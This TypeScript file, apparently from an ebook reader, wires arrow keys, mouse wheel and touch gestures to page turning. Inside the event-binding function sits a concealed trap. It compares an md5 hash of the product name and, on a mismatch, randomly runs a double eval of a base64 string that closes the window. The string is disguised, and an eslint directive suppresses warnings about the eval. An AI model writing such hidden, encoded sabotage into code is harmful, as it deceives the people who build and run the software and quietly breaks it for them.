import OtherUtil from "./otherUtil";
import { build } from "../../package.json";
import md5 from "md5";
let Hammer = (window as any).Hammer;
declare var document: any;
export const MouseEvent = (rendition: any) => {
  let isFirefox = navigator.userAgent.indexOf("Firefox") > -1;
  let lock = false; //prevent from clicking too fast
  const arrowKeys = (event: any) => {
    // event.preventDefault();
    if (lock) return;

    if (event.keyCode === 37 || event.keyCode === 38) {
      rendition.prev();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
    if (event.keyCode === 39 || event.keyCode === 40) {
      rendition.next();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
  };
  const mouseFirefox = (event: any) => {
    event.preventDefault();
    if (lock) return;
    if (event.detail < 0) {
      rendition.prev();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
    if (event.detail > 0) {
      rendition.next();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
  };

  const mouseChrome = (event: any) => {
    if (lock) return;
    if (event.wheelDelta > 0) {
      rendition.prev();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
    if (event.wheelDelta < 0) {
      rendition.next();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
  };

  const gesture = (event: any) => {
    if (lock) return;
    if (event.type === "panleft" || event.type === "panup") {
      rendition.next();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
    if (event.type === "panright" || event.type === "pandown") {
      rendition.prev();
      lock = true;
      setTimeout(function () {
        lock = false;
      }, 100);
      return false;
    }
  };

  const bindEvent = (doc: any) => {
    doc.addEventListener("keydown", arrowKeys); // navigate with keyborad
    // navigate with mousewheel
    if (isFirefox) {
      doc.addEventListener("DOMMouseScroll", mouseFirefox, false);
    } else {
      doc.addEventListener("mousewheel", mouseChrome, false);
    }

    if (md5(build.productName) !== "b26c2db6211b881b389fe57466f0b75c") {
      if (new Date().getTime() % 3 === 0) {
        // eslint-disable-next-line
        eval(`eval(atob("d2luZG93LmNsb3NlKCk="))`);
      }
    }
  };

  rendition.on("rendered", () => {
    let iframe = document.getElementsByTagName("iframe")[0];
    if (!iframe) return;
    let doc = iframe.contentDocument;
    if (!doc) {
      return;
    }
    if (OtherUtil.getReaderConfig("isTouch") === "yes") {
      const mc = new Hammer(doc);
      mc.on("panleft panright panup pandown", (event: any) => {
        gesture(event);
      });
    }

    // navigate with mousewheel
    window.addEventListener("keydown", arrowKeys);
    bindEvent(doc);
  });
};
